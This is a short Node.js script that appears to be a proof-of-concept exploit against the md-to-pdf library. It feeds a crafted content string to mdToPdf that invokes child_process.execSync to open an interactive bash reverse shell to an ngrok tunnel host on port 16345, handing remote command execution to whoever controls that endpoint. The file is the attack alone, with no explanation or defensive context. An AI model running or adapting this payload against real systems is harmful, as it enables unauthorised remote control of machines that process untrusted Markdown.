const { mdToPdf } = require('md-to-pdf');

var payload = '((require("child_process")).execSync("bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/16345 0>&1"))';

(async () => {
	await mdToPdf({ content: payload }, { dest: './output.pdf' });
})();